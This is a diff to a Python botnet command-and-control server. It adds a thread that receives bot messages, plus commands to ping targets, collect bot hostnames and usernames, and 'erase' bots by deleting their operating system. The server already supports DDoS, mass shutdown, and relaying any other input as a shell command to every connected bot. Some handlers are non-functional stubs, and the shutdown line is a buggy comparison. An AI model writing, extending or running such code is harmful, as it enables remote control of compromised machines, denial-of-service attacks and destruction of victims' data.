@@ -27,7 +27,17 @@ def listen():
         conn, ip = s.accept()
         start_recv = True
         connections.append(conn)
-        print(f"\n[+] {ip} has joined the server.")
+        print(f"\n[+] {ip} has joined the Botnet Server.")
+def recv():
+    while True:
+        for connection in connections:
+            try:
+                conn = connection
+                clientmsg = conn.recv(1024)
+                clientmsgdecode = clientmsg.decode()
+                print(f"\n[+] Message from Connection {conn}: {clientmsgdecode}\n")
+            except:
+                pass
 def instruct():
     print("[+] Commands List:")
     print("")
@@ -35,6 +45,10 @@ def instruct():
     print("[+] !listcon - Lists all the bots")
     print("[+] !botcount - Counts all of the bots connected")
     print("[+] !shutdownAll - Shuts down all connected bot computers")
+    print("[+] !checkPing <ip/domain> - Checks the ping of a server")
+    print("[+] !getbothost - Gets the hostnames of the connected bots")
+    print("[+] !erasebots - Destroys the bots(deletes their OS)")
+    print("[+] !getusername - Gets the username of the bot computers")
     print("")
     print("[+] Note: All other things said will run a terminal command on the bot computers.")
     print("[+] Restarting the server is recommended if there are disconnections from the bots.")
@@ -43,6 +57,7 @@ def instruct():
     print("")
     while True:
         try:
+            print("")
             instruction = input("[+] Enter your instruction: ")
             instruction = instruction.encode()
             if instruction.decode().lower() == "help":
@@ -64,30 +79,33 @@ def instruct():
                             print("")
                             time.sleep(2)
                             print("[+] DDoS Attack Started.")
-                            print("")
                         except:
                             print("[+] Invalid IP provided. Usage: !ddos <ip/domain>")
-                            print("")
                     else:
                         print("")
             elif instruction.decode().lower().startswith('!listcon'):
                 print("")
                 print("[+] List of bots:")
                 print(connections)
-                print("")
             elif instruction.decode().lower().startswith('!botcount'):
                 print("")
                 print(f"[+] Total Bot Count: {len(connections)}")
-                print("")
             elif instruction.decode().lower().startswith('!shutdownall'):
                 print("[+] Shutting Down Bots....")
                 time.sleep(2)
                 instruction == "shutdown /s"
                 instruction = instruction.decode()
+            elif instruction.decode().lower().startswith('!checkping'):
+                msg = instruction.decode().lower().split()
+                ipPing = msg[1]
+                os.system(f'ping {ipPing}')
+            elif instruction.decode().lower().startswith('!getbothost'):
+                print("\n[+] Obtaining hostnames of bots....")
+            elif instruction.decode().lower().startswith('!erasebots'):
+                print("\n[+] Eradicating Bots.....")
             else:
                 print("")
                 print(f"[+] Sending '{instruction.decode()}' as a bash command to the bots.....")
-                print("")
             for connection in connections:
                 try:
                     conn = connection
@@ -101,3 +119,5 @@ listeN = threading.Thread(target=listen)
 listeN.start()
 instrucT = threading.Thread(target=instruct)
 instrucT.start()
+recV = threading.Thread(target=recv)
+recV.start()
